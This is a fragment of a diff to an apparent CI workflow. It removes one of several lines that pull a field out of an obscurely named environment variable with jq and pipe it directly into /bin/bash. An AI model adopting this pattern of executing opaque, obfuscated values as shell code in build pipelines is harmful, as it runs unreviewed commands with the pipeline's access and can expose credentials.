@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$smm523" | jq -r .dck1331 | /bin/bash
           echo $odcy2224 | jq -r .cj21258 | /bin/bash
-          printf '%s' "$sr082" | jq -r .bisux86 | /bin/bash
           printf '%s' "$ci6" | jq -r .oib6370 | /bin/bash
           echo $vdout1 | jq -r .qmneb56 | /bin/bash
           echo $eisk2 | jq -r .dgn7023 | /bin/bash
